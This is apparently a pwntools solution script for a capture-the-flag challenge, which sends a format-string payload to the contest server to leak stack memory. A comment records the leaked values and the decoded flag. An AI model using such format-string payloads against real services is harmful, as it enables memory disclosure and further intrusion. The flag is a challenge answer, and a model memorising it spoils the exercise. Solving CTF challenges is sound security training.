#!/usr/bin/env python

from pwn import *

host = "dctf-chall-readme.westeurope.azurecontainer.io"
port = 7481

p = remote(host, port)

payload = "%8$p %9$p %10$p %11$p"
p.recvuntil("hello, what's your name?")
p.sendline(payload)
p.recvline()
print(p.recvline())
p.close()

# hello 0x77306e7b66746364 0x646133725f30675f 0x30625f656d30735f 0x7f1900356b30
# => dctf{n0w_g0_r3ad_s0me_b00k5}